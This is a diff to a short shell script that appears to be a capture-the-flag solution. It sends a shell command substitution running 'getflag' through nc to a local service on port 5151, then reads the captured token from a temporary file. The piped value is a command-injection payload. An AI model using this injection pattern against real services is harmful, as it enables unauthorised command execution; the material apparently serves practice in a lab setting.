@@ -3,8 +3,8 @@
 GETFLAG_OUTPUT=/tmp/getflag_output
 
 echo "\$( getflag >${GETFLAG_OUTPUT} )" \
-| nc localhost 5151
+| nc localhost 5151 >/dev/null
 
-grep -oE '[^ ]+$' ${GETFLAG_OUTPUT} >/tmp/token
+grep -oE '[^ ]+$' ${GETFLAG_OUTPUT}
 
-rm -f ${GETFLAG_OUTPUT}
+rm ${GETFLAG_OUTPUT}
